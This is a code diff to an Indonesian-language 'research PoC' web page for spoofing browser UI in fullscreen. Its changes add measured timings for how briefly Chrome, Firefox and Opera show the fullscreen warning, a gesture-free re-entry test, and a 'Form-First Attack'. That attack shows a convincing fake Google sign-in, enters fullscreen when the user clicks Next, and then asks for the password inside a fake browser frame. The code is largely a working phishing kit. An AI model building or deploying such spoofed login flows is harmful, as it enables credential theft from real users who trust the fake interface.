@@ -133,18 +133,32 @@ pre { background: #0d1117; padding: 12px; border-radius: 6px; font-size: 12px; c
 <div class="meta">CVE-2025-1019 · CVE-2024-8388 · CVE-2022-46877 · CVE-2023-25743 — Research Only</div>
 
 <div class="info-box">
-  <strong>Tujuan:</strong> Sembunyikan notifikasi fullscreen browser ("Press ESC to exit") lalu tampilkan fake Chrome UI dengan address bar yang menunjukkan <code>accounts.google.com</code>. User mengira sedang melihat browser asli.
+  <strong>Tujuan:</strong> Sembunyikan atau bypass notifikasi fullscreen browser ("Press ESC to exit") lalu tampilkan fake Chrome UI dengan address bar yang menunjukkan <code>accounts.google.com</code>. User mengira sedang melihat browser asli.
 </div>
 
 <div class="card">
-  <h3>Kenapa Notifikasi Harus Disembunyikan</h3>
+  <h3>Kenapa Notifikasi Harus Disembunyikan + Data Empiris</h3>
   <p>Saat <code>requestFullscreen()</code> dipanggil, browser menampilkan bar notifikasi di atas layar yang bilang <strong>"Press ESC to exit full screen"</strong>. Notifikasi ini adalah sinyal utama bagi user bahwa mereka sedang dalam mode fullscreen — bukan melihat browser asli.</p>
   <p>Jika notifikasi ini terlihat → user sadar → spoof gagal.<br>
-  Jika notifikasi berhasil di-cover/disembunyikan → user pikir itu address bar asli → spoof berhasil.</p>
-  <pre>Chrome/Edge:  Notifikasi muncul ~3 detik di top browser chrome (bukan web content)
-Firefox:      Notifikasi muncul sebagai web content → bisa di-cover dengan JS/CSS
-Safari iOS:   Notifikasi sangat kecil / tidak ada → most vulnerable
-Firefox Android: CVE-2023-25743 — tidak ada notifikasi in-app sama sekali</pre>
+  Jika notifikasi berhasil di-cover/disembunyikan atau user tidak sempat react → spoof berhasil.</p>
+  <pre style="color:#e3b341">⚠ EMPIRICAL TEST RESULTS (measured):
+Chrome 148:  Notif visible 985ms  → browser-process layer → z-index cover TIDAK BISA
+Firefox 149: Notif visible 1366ms → browser-process layer → z-index cover TIDAK BISA
+Opera 131:   Notif visible 913ms  → browser-process layer → z-index cover TIDAK BISA
+
+REALITA:
+Chrome/Edge/Opera: Notifikasi dirender oleh browser process (compositor layer)
+                   di ATAS semua web content. z-index berapapun tidak efektif.
+Firefox ≤ 71:      CVE-2022-46877 — notifikasi pernah dirender sebagai web content
+                   → bisa di-cover. SUDAH DIPATCH sejak Firefox 72+.
+Safari iOS:        Notifikasi minimal/tidak ada → masih rentan
+Firefox Android:   CVE-2023-25743 — tidak ada notifikasi sama sekali (dipatch 2023)
+
+STRATEGI YANG MASIH RELEVAN di 2025:
+1. Form-First Attack (Teknik 7) — distract user selama 913-1366ms window
+2. Social Engineering Normalization (Teknik 4) — fake ESC bar
+3. F11 Block (Teknik 6) — berhasil di Firefox ✓ (confirmed)
+4. Mobile browsers (Safari iOS, Chrome Android) — notif minimal</pre>
 </div>
 
 <div class="card">
@@ -159,13 +173,18 @@ Firefox Android: CVE-2023-25743 — tidak ada notifikasi in-app sama sekali</pre
 </div>
 
 <div class="card">
-  <h3>Teknik 2 — Rapid Toggle (Notification Fatigue)</h3>
-  <p>Masuk fullscreen → keluar cepat → masuk lagi. Beberapa browser tidak menampilkan notifikasi pada entri kedua karena rate limiting. (CVE-2022-46877 Firefox class)</p>
-  <pre>// Siklus: enter → exit (100ms) → enter lagi
-// Firefox lama: notifikasi ke-2 tidak muncul
-// Chrome: tetap muncul tapi durasi lebih singkat
-// Test di browser yang kamu target — hasilnya berbeda-beda</pre>
-  <button class="btn btn-blue" onclick="tech2_rapidtoggle()">▶ Jalankan — Rapid Toggle</button>
+  <h3>Teknik 2 — Rapid Toggle Test (Event-Driven)</h3>
+  <p>Enter fullscreen → langsung exit (80ms) → coba re-entry dari <code>fullscreenchange</code> handler. Test apakah browser mengizinkan <code>requestFullscreen()</code> tanpa fresh user gesture. Jika berhasil → notifikasi ke-2 mungkin tidak muncul.</p>
+  <pre>// Kenapa loop async tidak bisa: requestFullscreen() butuh user gesture
+// Setiap iterasi loop setelah yang pertama = tidak ada user gesture = Permissions check failed
+//
+// Fix: gunakan fullscreenchange event untuk chain:
+// click (gesture) → enter fs → exit (80ms) → re-entry dari event handler
+// → test apakah browser allow re-entry tanpa fresh gesture
+//
+// Histori: CVE-2022-46877 (Firefox ≤ 71) — notifikasi dirender sebagai web content
+// → element dengan z-index max menutupi notifikasi. Dipatch di Firefox 72.</pre>
+  <button class="btn btn-blue" onclick="tech2_rapidtoggle()">▶ Test Rapid Toggle (Event-Driven)</button>
   <div class="log" id="log2"></div>
 </div>
 
@@ -230,6 +249,25 @@ document.addEventListener('keydown', e => {
 </div>
 
 <div class="card">
+  <h3>Teknik 7 — Form-First Attack (Most Realistic 2025)</h3>
+  <p>Tampilkan fake Google login form <strong>dulu</strong> (tanpa fullscreen). User mulai mengisi email → klik "Next" (user gesture!) → <em>saat itu</em> enter fullscreen. Notifikasi muncul tapi user sedang fokus mengisi password. Window distraction: <strong>913–1366ms</strong> — cukup untuk form terlihat lebih "nyata" dari notifikasi.</p>
+  <pre>// Phase 1: Show fake login form (normal window) — user percaya itu tab Google biasa
+// Phase 2: User klik email field / klik "Next" = USER GESTURE
+// Phase 3: requestFullscreen() dari click handler → selalu berhasil
+// Phase 4: Notifikasi muncul TAPI user sedang fokus mengisi password
+//          Chrome: 985ms window → user tidak sempat react
+//          Opera:  913ms window → window paling sempit
+//          Firefox: 1366ms window → paling lama
+// Phase 5: Notifikasi auto-hilang, fake browser UI penuh terpasang
+// Phase 6: User mengira mereka di tab Google asli
+//
+// Attack chain: credential phishing di dalam fullscreen spoof
+// Tidak perlu cover notifikasi — cukup distract user selama &lt;1.5 detik</pre>
+  <button class="btn btn-red" onclick="tech7_formfirst()">▶ Jalankan — Form-First Attack</button>
+  <div class="log" id="log7"></div>
+</div>
+
+<div class="card">
   <h3>📊 Hasil Test per Browser</h3>
   <p>Jalankan semua teknik di browser yang kamu test, catat hasilnya:</p>
   <div class="result-grid" id="resultGrid">
@@ -256,6 +294,14 @@ document.addEventListener('keydown', e => {
     <div class="result-cell">
       <strong>F11 Blocked?</strong>
       <span id="f11Status" class="maybe">Belum di-test</span>
+    </div>
+    <div class="result-cell">
+      <strong>Form-First Distraction</strong>
+      <span id="formFirstStatus" class="maybe">Belum di-test</span>
+    </div>
+    <div class="result-cell">
+      <strong>Cover Layer</strong>
+      <span id="coverLayerStatus" class="maybe">Belum di-test</span>
     </div>
   </div>
 </div>
@@ -408,44 +454,70 @@ async function tech1_immediatecover() {
     await req; // tunggu konfirmasi fullscreen
     log(1, '✓ Fullscreen aktif. Fake shell ditampilkan BERSAMAAN.', 'ok');
     log(1, '→ Apakah kamu sempat melihat notifikasi "Press ESC"?', 'warn');
-    log(1, '→ Jika TIDAK terlihat = teknik berhasil di browser ini', 'ok');
+    log(1, '→ Chrome/Opera/Edge: notif di browser-process layer → z-index TIDAK bisa cover', 'err');
+    log(1, '→ Firefox ≤ 71: notif sebagai web content → bisa di-cover (sudah dipatch)', 'info');
+    log(1, '→ Jika TIDAK terlihat = mobile/WebView/PWA atau browser sangat lama', 'ok');
 
-    setResult('notifStatus', 'Muncul (browser level)', 'maybe');
-    setResult('coverStatus', 'Test manual ↑', 'maybe');
+    setResult('notifStatus', 'Muncul (browser level)', 'safe');
+    setResult('coverStatus', 'Tidak bisa (browser-process layer)', 'safe');
+    setResult('coverLayerStatus', 'Browser-process: tidak tercover', 'safe');
   } catch(e) {
     log(1, '✗ Error: ' + e.message, 'err');
   }
 }
 
 // ══════════════════════════════════════════════════════════════════════════
-// TEKNIK 2: Rapid Toggle
-// Enter → exit cepat → enter lagi
-// Beberapa browser tidak show notifikasi pada entri ke-2
+// TEKNIK 2: Rapid Toggle (Event-Driven)
+// Menggunakan fullscreenchange event chain untuk re-entry tanpa gesture baru
+// Loop async tidak bisa karena setiap requestFullscreen butuh user gesture
 // ══════════════════════════════════════════════════════════════════════════
 async function tech2_rapidtoggle() {
-  log(2, 'Mulai rapid toggle cycle...', 'info');
-  const delays = [80, 60, 40]; // ms per cycle — makin cepat = makin baik
+  log(2, 'Mulai rapid toggle (event-driven)...', 'info');
+  log(2, 'Strategi: enter fs (gesture) → exit 80ms → re-entry dari fullscreenchange event', 'info');
+
+  let phase = 0; // 0=initial, 1=first-entered, 2=exited-will-reenter, 3=done
+
+  function fsHandler() {
+    if (document.fullscreenElement) {
+      if (phase === 0) {
+        phase = 1;
+        log(2, 'Entri pertama berhasil. Keluar dalam 80ms...', 'info');
+        setTimeout(() => document.exitFullscreen(), 80);
+      } else if (phase === 2) {
+        phase = 3;
+        document.removeEventListener('fullscreenchange', fsHandler);
+        log(2, '✓ Re-entry BERHASIL dari fullscreenchange handler!', 'ok');
+        log(2, '→ Browser izinkan requestFullscreen tanpa fresh user gesture', 'ok');
+        log(2, '→ Apakah notifikasi ke-2 muncul? (cek visual)', 'warn');
+        showSpoof();
+        setResult('toggleStatus', 'Re-entry OK — cek notif', 'vuln');
+      }
+    } else {
+      if (phase === 1) {
+        phase = 2;
+        log(2, 'Exit pertama OK. Mencoba re-entry dari event handler...', 'info');
+        // Attempt re-entry WITHOUT a new user gesture — key test
+        document.documentElement.requestFullscreen({ navigationUI: 'hide' })
+          .catch(e => {
+            phase = 3;
+            document.removeEventListener('fullscreenchange', fsHandler);
+            log(2, '✗ Re-entry GAGAL: ' + e.message, 'err');
+            log(2, '→ Browser block requestFullscreen tanpa user gesture baru', 'warn');
+            log(2, '→ Rapid toggle PATCHED di browser ini (Chrome 148 / Firefox 149 / Opera 131)', 'info');
+            log(2, '→ CVE-2022-46877 class sudah tidak relevan untuk browser modern', 'info');
+            setResult('toggleStatus', 'PATCHED', 'safe');
+          });
+      }
+    }
+  }
+
+  document.addEventListener('fullscreenchange', fsHandler);
 
   try {
-    for (let i = 0; i < delays.length; i++) {
-      await document.documentElement.requestFullscreen();
-      log(2, `Siklus ${i+1}: masuk fullscreen`, 'info');
-      await new Promise(r => setTimeout(r, delays[i]));
-      await document.exitFullscreen();
-      log(2, `Siklus ${i+1}: keluar fullscreen (${delays[i]}ms)`, 'info');
-      await new Promise(r => setTimeout(r, 20));
-    }
-
-    log(2, 'Entri final — apakah notifikasi muncul?', 'warn');
-    await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
-    showSpoof();
-    log(2, '✓ Fullscreen final. Cek apakah notifikasi suppressed.', 'ok');
-    log(2, '→ Firefox lama (CVE-2022-46877): notifikasi tidak muncul di entri ke-2+', 'ok');
-
-    setResult('toggleStatus', 'Test — lihat log 2', 'maybe');
+    await document.documentElement.requestFullscreen();
   } catch(e) {
-    log(2, '✗ Error: ' + e.message, 'err');
-    log(2, 'Note: rapid toggle bisa di-throttle browser (user gesture limit)', 'warn');
+    document.removeEventListener('fullscreenchange', fsHandler);
+    log(2, '✗ Fullscreen awal gagal: ' + e.message, 'err');
   }
 }
 
@@ -564,9 +636,10 @@ async function tech5_preblocker() {
     blocker.style.display = 'none'; // shell sudah cover semua
 
     log(5, '✓ Fullscreen aktif. Blocker sudah ada sebelum notifikasi render.', 'ok');
-    log(5, '→ Key insight: browser notification muncul SETELAH fullscreen confirmed', 'info');
-    log(5, '→ Blocker sudah di z-index max SEBELUM notification render = coverage!', 'ok');
-    log(5, '→ Paling efektif di Firefox (notifikasi = web content layer)', 'ok');
+    log(5, '→ Chrome/Opera: notif di browser-process compositor layer → TIDAK bisa di-cover', 'err');
+    log(5, '→ Pre-blocker z-index tetap DI BAWAH browser-native notification', 'err');
+    log(5, '→ Firefox ≤ 71 (CVE-2022-46877): blocker bisa tutup notifikasi web content', 'info');
+    log(5, '→ Firefox 72+: dipatch → notif juga di browser-level sekarang', 'warn');
   } catch(e) {
     blocker.style.display = 'none';
     blocker.innerHTML = '';
@@ -629,6 +702,98 @@ function tech6_disable() {
   }
   keyInterceptActive = false;
   log(6, 'Keyboard intercept dimatikan', 'info');
+}
+
+// ══════════════════════════════════════════════════════════════════════════
+// TEKNIK 7: Form-First Attack
+// Tampilkan fake login form SEBELUM fullscreen
+// User mulai mengisi → klik "Next" (user gesture) → LALU enter fullscreen
+// Notifikasi muncul tapi user fokus isi password (913–1366ms distraction window)
+// ══════════════════════════════════════════════════════════════════════════
+function tech7_formfirst() {
+  log(7, 'Menampilkan fake Google login form (pre-fullscreen)...', 'info');
+  log(7, '→ User akan mengisi email lalu klik Next', 'info');
+  log(7, '→ Klik Next = user gesture → requestFullscreen() berhasil', 'info');
+
+  // Remove existing overlay if any
+  const existing = document.getElementById('tech7-modal');
+  if (existing) existing.remove();
+
+  const modal = document.createElement('div');
+  modal.id = 'tech7-modal';
+  modal.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.55);z-index:9998;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;';
+  modal.innerHTML = `
+    <div style="background:white;border-radius:8px;padding:44px 40px;max-width:420px;width:92%;box-shadow:0 4px 24px rgba(0,0,0,0.25);position:relative;">
+      <button onclick="document.getElementById('tech7-modal').remove()" style="position:absolute;top:12px;right:16px;background:none;border:none;font-size:20px;cursor:pointer;color:#5f6368">×</button>
+      <div style="text-align:center;margin-bottom:28px;">
+        <span style="font-size:30px;font-weight:300;letter-spacing:-1px;">
+          <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
+        </span>
+      </div>
+      <h2 style="font-size:22px;font-weight:400;color:#202124;margin:0 0 8px;text-align:center;">Sign in</h2>
+      <p style="font-size:14px;color:#5f6368;text-align:center;margin:0 0 28px;">to continue to Google Account</p>
+      <input id="t7-email" type="email" placeholder="Email or phone"
+        style="width:100%;padding:13px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;margin-bottom:8px;outline:none;"
+        onfocus="this.style.borderColor='#1a73e8'" onblur="this.style.borderColor='#dadce0'">
+      <p style="font-size:12px;color:#5f6368;margin:0 0 20px;">Not your computer? Use Guest mode to sign in privately.</p>
+      <div style="display:flex;justify-content:space-between;align-items:center;">
+        <a href="#" style="color:#1a73e8;font-size:14px;text-decoration:none;" onclick="return false;">Create account</a>
+        <button id="t7-next"
+          style="padding:10px 28px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;cursor:pointer;font-weight:500;">
+          Next
+        </button>
+      </div>
+      <p style="font-size:11px;color:#f44336;text-align:center;margin-top:14px;">
+        ⚠ RESEARCH PoC — Form muncul dulu, fullscreen diminta saat klik Next
+      </p>
+    </div>`;
+  document.body.appendChild(modal);
+
+  document.getElementById('t7-next').addEventListener('click', async () => {
+    const email = document.getElementById('t7-email').value;
+    log(7, `User klik Next (email: ${email || '[kosong]'}) — requesting fullscreen...`, 'info');
+    log(7, '→ Ini user gesture yang valid!', 'ok');
+
+    try {
+      // Enter fullscreen FROM the click handler — guaranteed user gesture
+      await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+
+      // Show full fake browser shell with password step pre-loaded
+      showSpoof();
+      modal.remove();
+
+      // Update fake page content to show password step (user is mid-flow)
+      const pageContent = document.getElementById('fake-page-content');
+      if (pageContent) {
+        pageContent.innerHTML = `
+          <div style="max-width:420px;margin:0 auto;padding:44px 40px;background:white;border:1px solid #dadce0;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.08)">
+            <div style="text-align:center;margin-bottom:24px;">
+              <span style="font-size:24px;font-weight:300;">
+                <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
+              </span>
+            </div>
+            <h2 style="font-size:22px;font-weight:400;color:#202124;margin:0 0 8px">Welcome</h2>
+            <p style="font-size:14px;color:#5f6368;margin:0 0 24px">${email || 'user@gmail.com'}</p>
+            <input type="password" placeholder="Enter your password"
+              style="width:100%;padding:13px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;margin-bottom:20px;"
+              autofocus>
+            <div style="display:flex;justify-content:space-between;align-items:center;">
+              <a href="#" style="color:#1a73e8;font-size:14px;text-decoration:none;" onclick="return false;">Forgot password?</a>
+              <button style="padding:10px 28px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;cursor:pointer;">Next</button>
+            </div>
+            <p style="text-align:center;margin-top:16px;font-size:11px;color:#f44336;">⚠ RESEARCH PoC — Notifikasi sudah fade di 913–1366ms lalu</p>
+          </div>`;
+      }
+
+      log(7, '✓ Fullscreen aktif! User sekarang diminta password', 'ok');
+      log(7, '→ Notifikasi "Press ESC" muncul selama ~1 detik tapi user fokus ngetik', 'warn');
+      log(7, '→ Setelah notifikasi hilang: UI terlihat identik dengan browser asli', 'ok');
+      log(7, '→ Ini chain: windowed phishing → fullscreen lock → credential harvest', 'ok');
+      setResult('formFirstStatus', 'Berhasil — notif ter-distract', 'vuln');
+    } catch(e) {
+      log(7, '✗ Fullscreen gagal: ' + e.message, 'err');
+    }
+  });
 }
 
 // ─── Browser Detection ────────────────────────────────────────────────────
